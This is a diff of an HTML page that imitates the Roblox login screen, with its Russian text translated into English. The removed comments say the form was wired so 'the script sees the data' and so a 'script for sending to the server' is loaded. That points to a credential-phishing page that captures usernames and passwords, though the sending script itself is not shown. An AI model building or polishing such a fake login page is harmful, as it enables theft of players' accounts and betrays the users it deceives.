@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -10,17 +10,16 @@
 </head>
 <body>
     <main class="login-card" aria-labelledby="login-title">
-        <h1 id="login-title">Войти в Roblox</h1>
+        <h1 id="login-title">Log In to Roblox</h1>
 
-        <!-- Добавил form и id, чтобы скрипт видел данные -->
         <form id="loginForm">
             <div class="demo-fields">
                 <input
                     class="demo-input"
                     type="text"
                     id="username"
-                    placeholder="Имя пользователя/Электронная почта/Телефон"
-                    aria-label="Имя пользователя, электронная почта или телефон"
+                    placeholder="Username/Email/Phone"
+                    aria-label="Username, email or phone"
                     autocomplete="off"
                     autocapitalize="off"
                     spellcheck="false"
@@ -30,47 +29,45 @@
                     class="demo-input"
                     type="password"
                     id="password"
-                    placeholder="Пароль"
-                    aria-label="Пароль"
+                    placeholder="Password"
+                    aria-label="Password"
                     autocomplete="new-password"
                     spellcheck="false"
                     required
                 >
 
-                <!-- Сделал type="submit", чтобы форма отправлялась -->
                 <button class="demo-submit" type="submit">
-                    Авторизоваться
+                    Log In
                 </button>
             </div>
         </form>
 
         <p class="demo-help" id="login-status" role="status" aria-live="polite">
-            Забыли пароль или имя пользователя?
+            Forgot Password or Username?
         </p>
 
         <hr class="demo-divider">
 
         <div class="demo-actions">
             <button class="demo-action" type="button">
-                Отправить мне одноразовый код по электронной почте
+                Email Me a One-Time Code
             </button>
             <button class="demo-action" type="button">
-                Быстрый вход
+                Quick Log In
             </button>
             <button class="demo-action" type="button">
-                Другие варианты входа в систему
+                Other Log In Options
             </button>
         </div>
 
         <div class="demo-footer">
-            <span>У вас нет аккаунта?</span>
+            <span>Don't have an account?</span>
             <button class="demo-link" type="button">
-                Зарегистрируйтесь
+                Sign Up
             </button>
         </div>
     </main>
 
-    <!-- Подключил твой скрипт отправки на сервер -->
     <script src="script.js"></script>
 </body>
 </html>
